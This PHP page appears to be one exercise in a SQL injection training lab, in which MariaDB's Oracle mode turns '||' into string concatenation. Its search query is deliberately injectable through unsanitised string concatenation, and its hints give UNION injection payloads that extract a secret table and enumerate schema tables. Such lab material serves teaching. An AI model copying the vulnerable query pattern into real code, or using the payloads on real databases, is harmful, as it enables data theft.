<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    $res = mysqli_query(
        $conn,
        "SELECT secret_value FROM oracle_secrets WHERE id=1 LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['secret_value']) {
        $_SESSION['mariadb_lab4_solved'] = true;
        header("Location: " . url_lab_from_slug("mariadb/lab4", $mode, $_GET['ref'] ?? ''));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 4. Oracle Mode: PL/SQL Syntax</h3>

    <h4>Scenario</h4>
    <p>
        A database administration panel exposes an internal data viewer. The MariaDB server
        has <strong>Oracle compatibility mode</strong> enabled via
        <code>SET SQL_MODE='ORACLE'</code>. This mode changes MariaDB's behavior to be
        more compatible with Oracle Database:
    </p>
    <ul>
        <li><code>DECODE()</code> works as Oracle's DECODE, not MySQL's</li>
        <li><code>%TYPE</code> and <code>%ROWTYPE</code> attributes are recognized</li>
        <li><code>VARCHAR2</code> is accepted as a data type</li>
        <li>Anonymous PL/SQL blocks with <code>BEGIN...END</code> are partially supported</li>
        <li>Empty strings are treated as NULL (Oracle behavior)</li>
        <li>The <code>||</code> operator is string concatenation, not logical OR</li>
    </ul>

    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span class="terminal-title">Oracle Mode. Concept</span>
        </div>
        <div class="terminal-body">
            <span class="prompt">mariadb&gt; </span>SET SQL_MODE='ORACLE';<br><br>
            <span class="prompt">mariadb&gt; </span>SELECT 'hello' || ' ' || 'world';<br>
            <span class="comment">-- Returns: 'hello world' (concatenation, not logical OR)</span><br><br>
            <span class="prompt">mariadb&gt; </span>SELECT DECODE(status, 'A', 'Active', 'I', 'Inactive', 'Unknown') FROM users;<br>
            <span class="comment">-- Oracle-style DECODE instead of MySQL's</span>
        </div>
    </div>

    <h4>Objective</h4>
    <p>
        The application sets Oracle mode before executing queries. The <code>||</code> operator
        now concatenates strings instead of performing logical OR. Use this changed behavior
        to craft a UNION injection that extracts the <strong>secret value</strong> from the
        <code>oracle_secrets</code> table. Use the <code>||</code> operator in your payload.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. The query returns 3 columns (id, name, value).<br>
        2. In Oracle mode, <code>||</code> concatenates strings: <code>'a' || 'b'</code> = <code>'ab'</code>.<br>
        3. Try: <code>' UNION SELECT id, 'PREFIX_' || secret_value, NULL FROM oracle_secrets -- -</code><br>
        4. Enumerate tables: <code>' UNION SELECT table_name, table_type, NULL FROM information_schema.tables WHERE table_schema=database() -- -</code><br>
        5. Check current SQL_MODE: <code>' UNION SELECT @@sql_mode, NULL, NULL -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mariadb_lab4_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You exploited Oracle compatibility mode and used the altered || concatenation operator to extract the secret.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Data Viewer</h4>
    <form method="POST" class="form-row">
<input type="text" name="name" class="input" placeholder="Search by name (try: SQL)" value="<?= htmlspecialchars($_POST['name'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['name'])) {
    $name = $_POST['name'];

    // Enable Oracle compatibility mode
    mysqli_query($conn, "SET SQL_MODE='ORACLE'");

    // INTENTIONALLY VULNERABLE: direct string concatenation
    // In Oracle mode, || is string concatenation, not logical OR
    $query = "SELECT id, name, value FROM oracle_data WHERE name LIKE '%$name%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MariaDB Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mariadb&gt; </span>SET SQL_MODE=\'ORACLE\';<br>';
    echo '    <span class="prompt">mariadb&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute and display results
    try {
    $result = mysqli_query($conn, $query);

    if (!$result) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars(mysqli_error($conn));
        echo '</div>';
    } else {
        $rows = [];
        while ($row = mysqli_fetch_assoc($result)) {
            $rows[] = $row;
        }

        if (empty($rows)) {
            echo '<div class="result-warning result-box">No data found.</div>';
        } else {
            echo '<table class="result-table">';
            echo '<tr><th>ID</th><th>Name</th><th>Value</th></tr>';
            foreach ($rows as $row) {
                echo '<tr>';
                echo '<td>' . htmlspecialchars($row['id'] ?? '') . '</td>';
                echo '<td>' . htmlspecialchars($row['name'] ?? '') . '</td>';
                echo '<td>' . htmlspecialchars($row['value'] ?? '') . '</td>';
                echo '</tr>';
            }
            echo '</table>';
        }
    }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars($e->getMessage());
        echo '</div>';
    }
}
?>

<?php endif; ?>
